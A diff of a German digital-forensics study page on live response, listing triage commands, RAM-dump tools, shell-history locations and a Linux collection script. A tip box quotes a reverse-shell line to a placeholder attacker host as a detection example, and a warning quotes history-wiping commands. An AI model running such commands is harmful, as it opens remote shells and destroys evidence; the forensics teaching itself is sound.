@@ -7,33 +7,431 @@
 <link rel="stylesheet" href="../style.css">
 </head>
 <body class="note-page">
+<aside id="sidebar">
+  <div class="sidebar-header">
+    <a href="../index.html" class="logo">DF <span>Field Notes</span></a>
+  </div>
+  <div class="search-box">
+    <input type="text" id="sidebarSearch" placeholder="Notizen durchsuchen..." autocomplete="off">
+    <div class="sb-search-results" id="sidebarSearchResults"></div>
+  </div>
+  <ul class="nav-list nav-home">
+    <li><a href="../index.html">Startseite</a></li>
+    <li><a href="../00-meta/glossary.html">Glossar (A-Z)</a></li>
+  </ul>
+  <ul class="nav-list">
+    <li><details><summary>Grundlagen (8)</summary><ul>
+      <li><a href="../01-grundlagen/zahlensysteme-und-kodierung.html">Zahlensysteme und Kodierung</a></li>
+      <li><a href="../01-grundlagen/rechnerarchitektur-von-neumann.html">Rechnerarchitektur</a></li>
+      <li><a href="../01-grundlagen/algorithmen-und-komplexitaet.html">Algorithmen und Komplexitaet</a></li>
+      <li><a href="../01-grundlagen/datenstrukturen.html">Datenstrukturen</a></li>
+      <li><a href="../01-grundlagen/programmierparadigmen.html">Programmierparadigmen</a></li>
+      <li><a href="../01-grundlagen/python-grundlagen.html">Python-Grundlagen</a></li>
+      <li><a href="../01-grundlagen/oop-klassen-vererbung.html">OOP: Klassen und Vererbung</a></li>
+      <li><a href="../01-grundlagen/softwareentwicklungsprozess.html">Softwareentwicklungsprozess</a></li>
+    </ul></details></li>
+    <li><details><summary>Betriebssysteme (15)</summary><ul>
+      <li><a href="../02-betriebssysteme/dateisysteme-uebersicht-fat-ntfs-ext4-apfs.html">Dateisysteme</a></li>
+      <li><a href="../02-betriebssysteme/betriebssystem-architekturen.html">BS-Architekturen</a></li>
+      <li><a href="../02-betriebssysteme/prozessmanagement-threads.html">Prozesse und Threads</a></li>
+      <li><a href="../02-betriebssysteme/memory-management.html">Memory Management</a></li>
+      <li><a href="../02-betriebssysteme/linux-administration.html">Linux-Administration</a></li>
+      <li><a href="../02-betriebssysteme/windows-administration.html">Windows-Administration</a></li>
+      <li><a href="../02-betriebssysteme/datentraeger-verschluesselung.html">Datentraeger-Verschluesselung</a></li>
+      <li><a href="../02-betriebssysteme/windows-registry-forensik.html">Registry Forensik</a></li>
+      <li><a href="../02-betriebssysteme/betriebssystem-forensik-spurensuche.html">Spurensuche</a></li>
+      <li><a href="../02-betriebssysteme/file-carving.html">File Carving</a></li>
+      <li><a href="../02-betriebssysteme/embedded-systems-iot-forensik.html">Embedded &amp; IoT</a></li>
+      <li><a href="../02-betriebssysteme/anti-forensik-betriebssystem.html">Anti-Forensik</a></li>
+      <li><a href="../02-betriebssysteme/mobile-forensik-android-ios.html">Mobile Forensik</a></li>
+      <li><a href="../02-betriebssysteme/container-docker-forensik.html">Container &amp; Docker</a></li>
+      <li><a href="../02-betriebssysteme/iot-security-grundlagen.html">IoT-Security</a></li>
+    </ul></details></li>
+    <li><details><summary>Netzwerke (12)</summary><ul>
+      <li><a href="../03-netzwerke/wireshark-basics-paketanalyse.html">Wireshark Basics</a></li>
+      <li><a href="../03-netzwerke/tcp-ip-protokollfamilie.html">TCP/IP</a></li>
+      <li><a href="../03-netzwerke/ip-adressierung-subnetting.html">IP &amp; Subnetting</a></li>
+      <li><a href="../03-netzwerke/routing-switching-vlans.html">Routing &amp; VLANs</a></li>
+      <li><a href="../03-netzwerke/dhcp-dns-arp.html">DHCP, DNS, ARP</a></li>
+      <li><a href="../03-netzwerke/vpn-und-firewalls.html">VPN &amp; Firewalls</a></li>
+      <li><a href="../03-netzwerke/netzwerkforensik-methoden.html">Netzwerkforensik</a></li>
+      <li><a href="../03-netzwerke/darknet-tor-i2p.html">Darknet &amp; Tor</a></li>
+      <li><a href="../03-netzwerke/web-sicherheit-owasp.html">Web &amp; OWASP</a></li>
+      <li><a href="../03-netzwerke/browser-forensik.html">Browser-Forensik</a></li>
+      <li><a href="../03-netzwerke/tls-ssl-forensik.html">TLS/SSL-Forensik</a></li>
+      <li><a href="../03-netzwerke/wireless-forensik.html">Wireless-Forensik</a></li>
+    </ul></details></li>
+    <li><details><summary>Forensik-Methoden (13)</summary><ul>
+      <li><a href="../04-forensik-methoden/forensischer-prozess-chain-of-custody.html">Prozess &amp; Chain of Custody</a></li>
+      <li><a href="../04-forensik-methoden/forensisches-imaging.html">Forensisches Imaging</a></li>
+      <li><a href="../04-forensik-methoden/write-blocker.html">Write-Blocker</a></li>
+      <li><a href="../04-forensik-methoden/datentraeger-forensik.html">Datentraeger-Forensik</a></li>
+      <li><a href="../04-forensik-methoden/arbeitsspeicher-forensik.html">Arbeitsspeicher (Memory)</a></li>
+      <li><a href="../04-forensik-methoden/logfile-analyse.html">Logfile-Analyse</a></li>
+      <li><a href="../04-forensik-methoden/triage-erstanalyse.html">Triage &amp; Erstanalyse</a></li>
+      <li><a href="../04-forensik-methoden/malware-analyse-statisch.html">Malware (Statisch)</a></li>
+      <li><a href="../04-forensik-methoden/malware-analyse-dynamisch.html">Malware (Dynamisch)</a></li>
+      <li><a href="../04-forensik-methoden/forensische-dokumentation.html">Dokumentation</a></li>
+      <li><a href="../04-forensik-methoden/datenbanken-forensik.html">Datenbanken</a></li>
+      <li><a href="../04-forensik-methoden/forensische-live-sicherung.html">Live-Sicherung</a></li>
+      <li><a href="../04-forensik-methoden/cloud-forensik.html">Cloud-Forensik</a></li>
+    </ul></details></li>
+    <li><details><summary>IT-Security (8)</summary><ul>
+      <li><a href="../05-it-security/schutzziele-cia-triad.html">Schutzziele (CIA)</a></li>
+      <li><a href="../05-it-security/risikoanalyse-threat-modeling.html">Risikoanalyse</a></li>
+      <li><a href="../05-it-security/kryptografie-grundlagen-symmetrisch-asymmetrisch.html">Kryptografie</a></li>
+      <li><a href="../05-it-security/authentifizierung-pki.html">Authentifizierung &amp; PKI</a></li>
+      <li><a href="../05-it-security/kryptoanalyse.html">Kryptoanalyse</a></li>
+      <li><a href="../05-it-security/post-quantum-blockchain.html">Post-Quantum &amp; Blockchain</a></li>
+      <li><a href="../05-it-security/security-incident-management.html">Incident Management</a></li>
+      <li><a href="../05-it-security/siem-und-monitoring.html">SIEM &amp; Monitoring</a></li>
+    </ul></details></li>
+    <li><details><summary>OSINT (5)</summary><ul>
+      <li><a href="../06-osint/osint-lifecycle-und-tooling.html">Lifecycle &amp; Tooling</a></li>
+      <li><a href="../06-osint/osint-recherche-methodik.html">Recherche-Methodik</a></li>
+      <li><a href="../06-osint/osint-anonymisierung-opsec.html">Anonymisierung &amp; OPSEC</a></li>
+      <li><a href="../06-osint/social-media-analyse.html">Social Media</a></li>
+      <li><a href="../06-osint/cybercrime-oekonomie.html">Cybercrime-Oekonomie</a></li>
+    </ul></details></li>
+    <li><details><summary>Recht &amp; Kriminalistik (9)</summary><ul>
+      <li><a href="../07-recht-kriminalistik/digitale-beweismittel-grundprinzipien.html">Digitale Beweismittel</a></li>
+      <li><a href="../07-recht-kriminalistik/strafrecht-allgemeiner-teil.html">Strafrecht AT</a></li>
+      <li><a href="../07-recht-kriminalistik/grundrechte-digital.html">Grundrechte</a></li>
+      <li><a href="../07-recht-kriminalistik/dsgvo-datenschutz.html">DSGVO</a></li>
+      <li><a href="../07-recht-kriminalistik/kriminalistik-grundlagen.html">Kriminalistik</a></li>
+      <li><a href="../07-recht-kriminalistik/tatortarbeit-spurenkunde.html">Tatort &amp; Spurenkunde</a></li>
+      <li><a href="../07-recht-kriminalistik/eingriffsrecht-tkue.html">Eingriffsrecht TKUe</a></li>
+      <li><a href="../07-recht-kriminalistik/ethik-informationssicherheit.html">Ethik</a></li>
+      <li><a href="../07-recht-kriminalistik/juristische-fallbearbeitung-gutachtenstil.html">Gutachtenstil</a></li>
+    </ul></details></li>
+    <li><details><summary>KI &amp; Forensik (5)</summary><ul>
+      <li><a href="../08-ki-forensik/llms-in-der-forensischen-analyse.html">LLMs in der Analyse</a></li>
+      <li><a href="../08-ki-forensik/ki-grundlagen-ml-overview.html">ML Overview</a></li>
+      <li><a href="../08-ki-forensik/neuronale-netze-deep-learning.html">Neuronale Netze</a></li>
+      <li><a href="../08-ki-forensik/decision-trees-klassifikation.html">Decision Trees</a></li>
+      <li><a href="../08-ki-forensik/bildforensik-objekterkennung.html">Bildforensik &amp; YOLO</a></li>
+    </ul></details></li>
+  </ul>
+  <ul class="nav-list">
+    <li><details><summary>Tools &amp; Referenzen</summary><ul>
+      <li><a href="../09-tools/ip-log-analyzer/README.html">IP Log Analyzer</a></li>
+      <li><a href="../09-tools/registry-parser/README.html">Registry Parser</a></li>
+      <li><a href="../00-meta/glossary.html">Glossar (A-Z)</a></li>
+      <li><a href="../INDEX.html">Themen-Index</a></li>
+      <li><a href="https://github.com/NicCsn/digital-forensics-notes">GitHub</a></li>
+    </ul></details></li>
+  </ul>
+</aside>
+<div class="note-wrapper">
 <nav class="top-nav">
   <a href="../index.html" class="home-link">DF Field Notes</a>
-  <span class="nav-crumb">/ <a href="../index.html">Forensik-Methoden</a> / Live-Sicherung</span>
+  <span class="nav-crumb">/ <a href="../04-forensik-methoden/index.html">Forensik-Methoden</a> / Live-Sicherung</span>
 </nav>
 <main><article>
 <h1>Forensische Live-Sicherung <span class="diff-badge diff-intermediate">Mittel</span></h1>
+<details class="fold"><summary>Inhaltsverzeichnis</summary><ol><li><a href="#kurz">Kurzüberblick</a></li><li><a href="#order">Order of Volatility (RFC 3227)</a></li><li><a href="#entscheidungen">Live-System-Entscheidungen</a></li><li><a href="#live-response-tools">Live-Response-Tools</a></li><li><a href="#windows-commands">Windows Live-Response-Kommandos</a></li><li><a href="#linux-commands">Linux Live-Response-Kommandos</a></li><li><a href="#ram-dump">RAM-Dump-Tools</a></li><li><a href="#shell-history">Shell-History</a></li><li><a href="#praktische-anwendung">Praktische Anwendung</a></li><li><a href="#quellen">Quellen / Weiterführendes</a></li></ol></details>
 
-<h2 id="kurz">Kurzueberblick</h2>
-<p>Live-Forensik: Du triffst ein laufendes System an. Jeder Befehl, den du ausfuehrst, veraendert Spuren. Deshalb gilt strikt: Fluechtigstes zuerst sichern!</p>
+<h2 id="kurz">Kurzüberblick</h2>
+<p>Live-Forensik: Du triffst ein <strong>laufendes System</strong> an. Jeder Befehl, den du ausführst, verändert Spuren. Jede Sekunde, die du wartest, kann Daten kosten. Deshalb gilt strikt: Flüchtigstes zuerst sichern — und vorher genau wissen, was du tust.</p>
+
+<div class="callout danger"><strong>NIEMALS:</strong><br>
+– Das System herunterfahren, ohne RAM-Dump zu machen<br>
+– Fremde USB-Sticks einstecken (Malware kann sich verbreiten)<br>
+– Das System weiter benutzen ("nur kurz was googlen")<br>
+– Lokale Tools auf dem Asservat nutzen (könnten rootkit-infiziert sein)<br>
+– Ein verschlüsseltes System herunterfahren (Schlüssel im RAM)</div>
 
 <h2 id="order">Order of Volatility (RFC 3227)</h2>
-<div class="timeline">
-<div class="tl-item"><strong>1. Register, CPU-Cache</strong><p>Mikrosekunden. Praktisch nicht sicherbar (nur per Hardware-Debugger).</p></div>
-<div class="tl-item"><strong>2. RAM</strong><p><span class="severity critical">Kritisch!</span> Verloren beim Ausschalten. Allerhoechste Prioritaet!</p></div>
-<div class="tl-item"><strong>3. Netzwerkverbindungen</strong><p>Minuten. State geht verloren. <code>netstat</code>, <code>ss</code>, <code>arp</code> sichern.</p></div>
-<div class="tl-item"><strong>4. Laufende Prozesse</strong><p>Veraendert sich staendig. Mindestens Liste sichern mit <code>ps auxf</code>.</p></div>
-<div class="tl-item"><strong>5. Festplatten / SSDs</strong><p>Persistent. Zuletzt, nachdem alles andere gesichert ist.</p></div>
-</div>
+<p>Die RFC 3227 definiert die Reihenfolge, in der flüchtige Daten gesichert werden müssen — von den kurzlebigsten zu den persistentesten:</p>
 
-<h2 id="entscheidungen">Live-System-Entscheidungen</h2>
-<table><thead><tr><th>Frage</th><th>Empfehlung</th><th>Begruendung</th></tr></thead><tbody>
-<tr><td>Runterfahren oder laufen lassen?</td><td><span class="severity low">Laufen lassen</span></td><td>RAM bleibt erhalten, C2-Verbindung beobachtbar</td></tr>
-<tr><td>Netzwerk trennen?</td><td><span class="severity medium">Ja</span> (bei C2-Gefahr)</td><td>Unterbricht laufende Datenexfiltration</td></tr>
-<tr><td>Verschluesseltes System?</td><td><span class="severity critical">NIEMALS herunterfahren!</span></td><td>Schluessel gehen im RAM verloren</td></tr>
+<table class="styled-table">
+<thead><tr><th>Rang</th><th>Datenquelle</th><th>Lebensdauer</th><th>Größe</th><th>Tool / Methode</th></tr></thead><tbody>
+<tr><td>1</td><td><strong>Register, CPU-Cache</strong></td><td>Nanosekunden</td><td>Kilobytes</td><td>Praktisch nicht sicherbar (nur per JTAG/Hardware-Debugger)</td></tr>
+<tr><td>2</td><td><strong>ARP-Cache, RAM-Disk</strong></td><td>Sekunden bis Minuten</td><td>Kilobytes bis Megabytes</td><td><code>arp -a</code>, RAM-Dump</td></tr>
+<tr><td>3</td><td><strong>Netzwerkverbindungen, Routing-Tabelle</strong></td><td>Minuten</td><td>Kilobytes</td><td><code>netstat -tunap</code>, <code>ss -tunap</code>, <code>route print</code></td></tr>
+<tr><td>4</td><td><strong>Laufende Prozesse, Dienste</strong></td><td>Minuten bis Stunden</td><td>Kilobytes</td><td><code>ps auxf</code>, <code>tasklist /v</code>, <code>sc query</code></td></tr>
+<tr><td>5</td><td><strong>Hauptspeicher (RAM)</strong></td><td>Bis zum Ausschalten</td><td>Gigabytes</td><td>WinPMEM, LiME, DumpIt, Magnet RAM Capture</td></tr>
+<tr><td>6</td><td><strong>Auslagerungsdateien, Swap</strong></td><td>Über Neustart hinaus</td><td>Gigabytes</td><td><code>pagefile.sys</code>, <code>swap</code> sichern</td></tr>
+<tr><td>7</td><td><strong>Festplatten / SSDs</strong></td><td>Jahre</td><td>Terabytes</td><td>Forensisches Imaging (als Letztes)</td></tr>
 </tbody></table>
 
-<div class="callout danger"><strong>NIEMALS:</strong> Das System herunterfahren ohne RAM-Dump. Fremde USB-Sticks einstecken. Das System weiter benutzen ("nur kurz was googlen").</div>
+<div class="callout warning"><strong>Begründung der Reihenfolge:</strong> Wenn du zuerst die Festplatte ausliest, ist der RAM vielleicht schon kaputt (weil das Disk-Imaging 4 Stunden dauert). Wenn du zuerst den RAM dumpst, überlebt die Festplatte das locker. Immer vom Flüchtigsten zum Stablisten arbeiten.</div>
+
+<h2 id="entscheidungen">Live-System-Entscheidungen</h2>
+<table class="styled-table"><thead><tr><th>Frage</th><th>Empfehlung</th><th>Begründung</th></tr></thead><tbody>
+<tr><td>Runterfahren oder laufen lassen?</td><td><strong>Laufen lassen</strong></td><td>RAM bleibt erhalten, C2-Verbindung beobachtbar, aktive Sessions erhalten</td></tr>
+<tr><td>Netzwerk trennen?</td><td><strong>Ja</strong> (bei C2-Gefahr)<br><strong>Nein</strong> (bei reiner Beobachtung)</td><td>Unterbricht laufende Datenexfiltration, aber löscht aktive TCP-Sessions aus dem RAM</td></tr>
+<tr><td>Verschlüsseltes System?</td><td><strong>NIEMALS herunterfahren!</strong></td><td>Schlüssel (FDE-Key, BitLocker-Masterkey) liegen nur im RAM — Herunterfahren = Schlüssel verloren</td></tr>
+<tr><td>Eigene Tools auf Asservat ausführen?</td><td><strong>NEIN</strong></td><td>Tools vom Asservat könnten rootkit-infiziert sein und falsche Daten liefern</td></tr>
+<tr><td>Dokumentation?</td><td><strong>JEDEN BEFEHL protokollieren</strong></td><td>Jeder ausgeführte Befehl verändert das System. Gericht fragt: "Was genau haben Sie gemacht?"</td></tr>
+</tbody></table>
+
+<h2 id="live-response-tools">Live-Response-Tools</h2>
+
+<table class="styled-table">
+<thead><tr><th>Tool</th><th>Plattform</th><th>Beschreibung</th><th>Vorteil</th></tr></thead><tbody>
+<tr><td><strong>KAPE</strong><br>(Kroll Artifact Parser and Extractor)</td><td>Windows</td><td>Sammelt forensische Artefakte per Target-Modulen und parst sie mit Modulen. Extrem schnell (Minuten, nicht Stunden).</td><td>Modular, konfigurierbar, CLI + GUI, aktiv weiterentwickelt</td></tr>
+<tr><td><strong>Velociraptor</strong></td><td>Win/Lin/macOS</td><td>Open-Source DFIR-Framework mit Agent-basierter Collection. Verwendet VQL (Velociraptor Query Language).</td><td>Remote-Collection möglich, Echtzeit-Monitoring, skalierbar (tausende Endpoints)</td></tr>
+<tr><td><strong>CyLR</strong></td><td>Win/Lin/macOS</td><td>Leichtgewichtiger Live-Response Collector. Sammelt Dateien von einer vordefinierten Liste und packt sie in ein ZIP.</td><td>Kein Installer nötig (ein Binary), schnell, für Triage optimiert</td></tr>
+<tr><td><strong>GRR</strong><br>(Google Rapid Response)</td><td>Win/Lin/macOS</td><td>Python-basiertes DFIR-Framework von Google. Agent + Server-Architektur.</td><td>Skalierbar auf zehntausende Endpoints, YARA-Scanning integriert</td></tr>
+<tr><td><strong>PowerShell (nativ)</strong></td><td>Windows</td><td>Get-WinEvent, Get-Process, Get-Service, Get-NetTCPConnection — alles ohne externe Tools</td><td>Immer verfügbar, keine Installation nötig</td></tr>
+</tbody></table>
+
+<h2 id="windows-commands">Windows Live-Response-Kommandos</h2>
+
+<pre><code># ===== NETZWERK =====
+netstat -anob                  # Alle Verbindungen mit PID und Binary
+netstat -na | findstr ESTABLISHED
+ipconfig /all                  # IP, DHCP, DNS, MAC
+route print                    # Routing-Tabelle
+arp -a                         # ARP-Cache
+
+# ===== PROZESSE =====
+tasklist /v                    # Laufende Prozesse mit Window-Title
+tasklist /svc                  # Prozesse + ihre Dienste
+tasklist /m                    # Geladene DLLs pro Prozess
+wmic process list full         # Extrem detailliert (veraltet, aber nützlich)
+
+# ===== DIENSTE =====
+sc query state= all            # Alle Dienste und ihr Status
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+# ===== EVENTLOG =====
+wevtutil qe Security /c:50 /rd:true /f:text
+Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.Id -eq 4624 -or $_.Id -eq 4625}
+Get-WinEvent -LogName System -MaxEvents 100 | Where-Object {$_.Id -eq 7045}
+
+# ===== BENUTZER &amp; SESSIONS =====
+query user                     # Wer ist gerade eingeloggt?
+net user                       # Lokale Benutzer
+net localgroup Administratoren # Wer ist Admin?
+net session                    # Netzwerk-Sessions auf diesem Rechner
+
+# ===== SCHEDULED TASKS =====
+schtasks /query /fo LIST /v
+
+# ===== REGISTRY (flüchtige Hives) =====
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SYSTEM\CurrentControlSet\Services</code></pre>
+
+<div class="callout info"><strong>Sysinternals-Schlüssel-Tools:</strong> <code>pslist</code>, <code>psservice</code>, <code>tcpview</code>, <code>autorunsc</code>, <code>procexp</code> (GUI) — diese Tools sind auf einem forensischen USB-Stick vorbereitet und werden <em>nicht</em> vom Asservat ausgeführt, sondern vom USB-Stick.</div>
+
+<h2 id="linux-commands">Linux Live-Response-Kommandos</h2>
+
+<pre><code># ===== SYSTEM =====
+uname -a                       # Kernel-Version, Architektur, Hostname
+uptime                         # Wie lange läuft das System schon?
+date                           # Aktuelle Systemzeit (UTC?)
+df -h                          # Belegter Speicher
+mount                          # Alle gemounteten Dateisysteme
+
+# ===== PROZESSE =====
+ps auxf                        # Baumdarstellung (Eltern-Kind)
+ps aux --forest                # Alternative
+pstree -p                      # Noch kompakterer Baum
+lsof                           # Alle offenen Dateien (File Descriptors)
+lsof -i                        # Nur Netzwerk-Dateideskriptoren
+
+# ===== NETZWERK =====
+ss -tunap                      # Moderner Ersatz für netstat
+netstat -tunap                 # Legacy (aber oft noch da)
+ip addr                        # IP-Adressen
+ip route                       # Routing-Tabelle
+arp -a                         # ARP-Cache
+iptables -L -n -v              # Firewall-Regeln
+
+# ===== BENUTZER =====
+who                            # Wer ist eingeloggt?
+w                              # Mit Aktivität
+last -n 20                     # Letzte 20 Login-Events
+lastlog                        # Letzter Login pro User
+
+# ===== /proc/ - Goldgrube! =====
+cat /proc/mounts               # Mount-Info
+cat /proc/modules              # Geladene Kernelmodule (Rootkits?)
+cat /proc/net/tcp              # TCP-Verbindungstabelle (roh)
+cat /proc/net/arp              # ARP-Tabelle
+cat /proc/meminfo              # Speicherstatistik
+ls -la /proc/*/fd/             # File-Deskriptoren aller Prozesse
+cat /proc/sysrq-trigger        # Achtung! Kann Reboot auslösen!
+
+# ===== DIENSTE =====
+systemctl list-units --type=service --state=running
+service --status-all 2>/dev/null</code></pre>
+
+<div class="callout tip"><strong>Wichtigster Befehl:</strong> <code>cat /proc/*/cmdline | tr '\0' ' '</code> — zeigt die exakte Kommandozeile jedes laufenden Prozesses. Findet C2-Implants (z.B. <code>bash -i >& /dev/tcp/attacker.com/4444 0>&1</code>).</div>
+
+<h2 id="ram-dump">RAM-Dump-Tools</h2>
+
+<table class="styled-table">
+<thead><tr><th>Plattform</th><th>Tool</th><th>Methode</th><th>Ausgabeformat</th></tr></thead><tbody>
+<tr><td>Windows</td><td><strong>WinPMEM</strong> (Rekall)</td><td>Kernel-Treiber liest physischen RAM aus</td><td>RAW, ELF, AFF4</td></tr>
+<tr><td>Windows</td><td><strong>DumpIt</strong> (Magnet Forensics)</td><td>Eigenständiges Binary, ein Klick</td><td>RAW</td></tr>
+<tr><td>Windows</td><td><strong>Magnet RAM Capture</strong></td><td>GUI-Tool, für First Responder optimiert</td><td>RAW</td></tr>
+<tr><td>Windows</td><td><strong>FTK Imager</strong></td><td>"Capture Memory"-Funktion (GUI)</td><td>.mem (RAW)</td></tr>
+<tr><td>Linux</td><td><strong>LiME</strong> (Linux Memory Extractor)</td><td>Kernel-Modul, liest /dev/mem-ähnliche Methoden</td><td>RAW, lime (mit Header)</td></tr>
+<tr><td>Linux</td><td><strong>fmem</strong></td><td>Erstellt /dev/fmem-Device, dann dd</td><td>RAW (via dd)</td></tr>
+<tr><td>Linux</td><td><strong>avml</strong> (Microsoft)</td><td>Userland, kein Kernel-Modul nötig</td><td>RAW (.lime kompatibel)</td></tr>
+<tr><td>macOS</td><td><strong>osxpmem</strong> (Rekall)</td><td>Kernel-Extension zum Auslesen des physischen RAMs</td><td>RAW, ELF, AFF4</td></tr>
+</tbody></table>
+
+<pre><code># ===== LiME (Linux) =====
+# Kernel-Modul laden und RAM in Datei + über Netzwerk streamen
+sudo insmod lime.ko path=/mnt/evidence/ram.lime format=lime
+# Variante: Über Netzwerk an Collector schicken
+sudo insmod lime.ko path=tcp:4444 format=lime
+
+# ===== WinPMEM (Windows) =====
+# Als Administrator:
+winpmem.exe -o C:\evidence\ram.aff4 -d aff4
+
+# ===== avml (Linux, Userland) =====
+avml /mnt/evidence/ram.lime</code></pre>
+
+<div class="callout warning"><strong>RAM-Dump verändert RAM!</strong> Jedes Tool, das RAM ausliest, muss selbst in den RAM geladen werden und belegt Speicher. Bei LiME sind das ~0.5-2 MB Verlust, bei WinPMEM ähnlich. Das ist akzeptiert und muss im Bericht dokumentiert werden.</div>
+
+<h2 id="shell-history">Shell-History — die Timeline des Angreifers</h2>
+
+<p>Shell-History-Dateien sind eine Goldgrube für die Rekonstruktion von Angreifer-Aktivitäten:</p>
+
+<table class="styled-table">
+<thead><tr><th>Shell</th><th>Datei</th><th>Format / Besonderheit</th></tr></thead><tbody>
+<tr><td>Bash</td><td><code>~/.bash_history</code></td><td>Eine Zeile pro Befehl, kein Zeitstempel (ausser HISTTIMEFORMAT ist gesetzt)</td></tr>
+<tr><td>Zsh</td><td><code>~/.zsh_history</code></td><td>Format: <code>: timestamp:duration;befehl</code> — enthält Zeitstempel und Ausführungsdauer</td></tr>
+<tr><td>PowerShell (Win)</td><td><code>%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></td><td>PSReadLine (PowerShell 5.0+) speichert Befehle mit Historie</td></tr>
+<tr><td>PowerShell (Win, Legacy)</td><td>EventLog: Event ID 4104 (Script Block Logging)</td><td>Nur wenn Script Block Logging aktiviert ist</td></tr>
+<tr><td>MySQL-Client</td><td><code>~/.mysql_history</code></td><td>SQL-Statements — kann Passwörter in CREATE USER/GRANT enthalten</td></tr>
+<tr><td>Redis</td><td><code>~/.rediscli_history</code></td><td>Redis-Kommandos</td></tr>
+</tbody></table>
+
+<pre><code># Bash-History suchen (auch root!)
+find / -name ".bash_history" -exec ls -la {} \; -exec tail -20 {} \; 2>/dev/null
+
+# Zsh-History mit Zeitstempeln extrahieren
+grep -E "^:" ~/.zsh_history | while IFS=':;' read _ ts dur cmd; do
+  echo "$(date -d @$ts '+%Y-%m-%d %H:%M:%S') $cmd"
+done
+
+# Powershell-History (auf Windows-Image offline)
+cat /mnt/evidence/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt 2>/dev/null</code></pre>
+
+<div class="callout warning"><strong>Angreifer löschen History:</strong> <code>history -c && rm ~/.bash_history</code> oder <code>unset HISTFILE</code> sind Standard-Anti-Forensik. Fehlt die History-Datei komplett oder ist sie ungewöhnlich kurz, ist das selbst ein Hinweis (Log-Wiping). Im RAM-Dump können gelöschte History-Einträge noch vorhanden sein.</div>
+
+<h2 id="praktische-anwendung">Praktische Anwendung: Live-Response-Script (Linux)</h2>
+
+<pre><code>#!/bin/bash
+# live-response.sh — Forensisches Live-Response-Skript (Linux)
+# Verwendung: bash live-response.sh /mnt/evidence/Fall001/
+
+set -e
+OUTDIR="${1:-/tmp/live-response}"
+TIMESTAMP=$(date -u +%Y%m%d_%H%M%S_UTC)
+HOSTNAME=$(hostname)
+CASEDIR="$OUTDIR/${HOSTNAME}_$TIMESTAMP"
+mkdir -p "$CASEDIR"
+LOG="$CASEDIR/00_log.txt"
+
+echo "=== LIVE RESPONSE START: $(date -u) ===" | tee "$LOG"
+echo "Ermittler: $(whoami)" | tee -a "$LOG"
+echo "System: $(uname -a)" | tee -a "$LOG"
+echo "Uptime: $(uptime)" | tee -a "$LOG"
+
+# 1. RAM-Dump (allererster Schritt!)
+echo "[1/8] RAM-Dump..." | tee -a "$LOG"
+if [ -f /usr/lib/lime/lime.ko ]; then
+  insmod /usr/lib/lime/lime.ko path="$CASEDIR/ram.lime" format=lime
+  echo "LiME geschrieben: $CASEDIR/ram.lime" | tee -a "$LOG"
+else
+  echo "WARNUNG: Kein LiME-Modul gefunden, RAM-Dump übersprungen!" | tee -a "$LOG"
+fi
+
+# 2. Netzwerk-Informationen
+echo "[2/8] Netzwerk sichern..." | tee -a "$LOG"
+ss -tunap > "$CASEDIR/01_netstat_ss.txt" 2>&1
+ip addr > "$CASEDIR/02_ip_addr.txt" 2>&1
+ip route > "$CASEDIR/03_ip_route.txt" 2>&1
+arp -a > "$CASEDIR/04_arp_cache.txt" 2>&1
+iptables-save > "$CASEDIR/05_iptables.txt" 2>&1
+
+# 3. Prozesse
+echo "[3/8] Prozesse sichern..." | tee -a "$LOG"
+ps auxf > "$CASEDIR/06_ps_auxf.txt" 2>&1
+lsof > "$CASEDIR/07_lsof.txt" 2>&1
+for pid_dir in /proc/[0-9]*; do
+  pid=$(basename "$pid_dir")
+  cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ' >> "$CASEDIR/08_cmdline_all.txt"
+  echo "" >> "$CASEDIR/08_cmdline_all.txt"
+done
+
+# 4. Benutzer &amp; Sessions
+echo "[4/8] Benutzer sichern..." | tee -a "$LOG"
+who > "$CASEDIR/09_who.txt" 2>&1
+last -n 100 > "$CASEDIR/10_last.txt" 2>&1
+cat /etc/passwd > "$CASEDIR/11_passwd.txt" 2>&1
+cat /etc/shadow > "$CASEDIR/11_shadow.txt" 2>&1
+
+# 5. Shell-History
+echo "[5/8] History-Dateien sichern..." | tee -a "$LOG"
+find / -maxdepth 5 -name ".*history" -exec cp --parents {} "$CASEDIR/history/" \; 2>/dev/null
+
+# 6. Geladene Kernel-Module (Rootkit-Suche)
+echo "[6/8] Kernelmodule sichern..." | tee -a "$LOG"
+lsmod > "$CASEDIR/12_lsmod.txt" 2>&1
+cat /proc/modules > "$CASEDIR/13_proc_modules.txt" 2>&1
+
+# 7. Mount- und Dateisystem-Info
+echo "[7/8] Dateisystem-Info sichern..." | tee -a "$LOG"
+mount > "$CASEDIR/14_mount.txt" 2>&1
+df -h > "$CASEDIR/15_df.txt" 2>&1
+lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,MODEL,SERIAL > "$CASEDIR/16_lsblk.txt" 2>&1
+
+# 8. Logs kopieren
+echo "[8/8] Logs kopieren..." | tee -a "$LOG"
+cp -r /var/log "$CASEDIR/var_log" 2>/dev/null
+
+# HASH-Protokoll
+echo "=== HASH-PROTOKOLL ===" | tee -a "$LOG"
+cd "$OUTDIR"
+find "${HOSTNAME}_$TIMESTAMP" -type f -exec sha256sum {} \; > "${HOSTNAME}_$TIMESTAMP/sha256_manifest.txt" 2>/dev/null
+sha256sum "${HOSTNAME}_$TIMESTAMP/sha256_manifest.txt" | tee -a "$LOG"
+
+echo "=== LIVE RESPONSE ENDE: $(date -u) ===" | tee -a "$LOG"
+echo "Alle Daten gespeichert in: $CASEDIR"</code></pre>
+
+<div class="callout info"><strong>Wichtige Annahmen:</strong> Dieses Skript wird von einem forensischen USB-Stick ausgeführt (gemountet unter <code>/mnt/evidence</code>). Es läuft NICHT vom Asservat selbst. Das Skript erzeugt ein SHA-256-Manifest aller gesammelten Dateien für die Chain of Custody.</div>
+
+<h2 id="quellen">Quellen / Weiterführendes</h2>
+
+<ul>
+  <li><a href="https://datatracker.ietf.org/doc/html/rfc3227">RFC 3227: Guidelines for Evidence Collection and Archiving</a></li>
+  <li><a href="https://www.kroll.com/en/insights/publications/cyber/kape">KAPE — Kroll Artifact Parser and Extractor</a></li>
